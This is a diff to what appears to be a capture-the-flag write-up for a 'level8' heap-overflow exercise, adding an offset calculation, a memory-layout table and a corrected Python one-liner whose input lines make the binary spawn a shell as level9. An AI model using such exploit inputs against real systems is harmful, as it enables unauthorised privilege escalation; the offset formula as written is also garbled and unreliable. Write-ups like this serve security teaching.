@@ -61,8 +61,15 @@ service pastequepasteque
 
 Since the allocations of [Auth] and [Service] are contiguous, [Login]'s check of [Auth] will overflow into [Service].
 
+The overflow will check the byte at *offset 32* from the address `0x804a008`. The length of the string needed at `service` will thus be `32 - 0x804a018 - 0x804a008 == 16`.
+
+What we want is for the memory to look like this
+|auth||||||||||||||\||service|||||||||||||||v|
+|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|
+|a|||||||||||||||p|a|s|t|e|q|u|e|p|a|s|t|e|q|u|e|
+
 ```sh
-(cat <(python -c 'print("auth a"); print("service pastequepasteque"); print("login");)') -) | ./level8
+(cat <(python -c 'print("auth a"); print("service pastequepasteque"); print("login");') -) | ./level8
 
 whoami
 level9
